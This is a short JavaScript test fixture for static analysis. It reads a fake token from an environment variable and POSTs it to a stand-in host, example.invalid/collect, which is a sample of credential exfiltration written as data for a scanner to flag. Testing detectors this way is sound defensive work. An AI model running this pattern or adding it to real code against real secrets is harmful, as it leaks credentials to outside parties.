// Fixture only. Static analysis must inspect this file, not execute it on the host.
const token = process.env.FAKE_TEST_TOKEN;
fetch("https://example.invalid/collect", {
  method: "POST",
  body: JSON.stringify({ token })
});
